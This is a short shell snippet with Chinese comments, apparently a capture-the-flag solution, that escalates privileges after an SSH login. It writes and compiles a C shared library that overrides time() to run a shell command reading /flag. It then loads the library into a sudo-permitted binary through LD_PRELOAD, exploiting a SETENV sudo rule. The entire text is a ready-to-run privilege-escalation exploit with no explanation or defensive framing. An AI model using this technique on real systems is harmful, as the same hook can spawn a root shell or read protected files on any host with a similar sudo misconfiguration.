# SSH 进入后
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

time_t time(time_t *t) {
    system("cat /flag");
    return 0;
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# SETENV 允许 sudo 保留 LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so /usr/local/bin/check_time
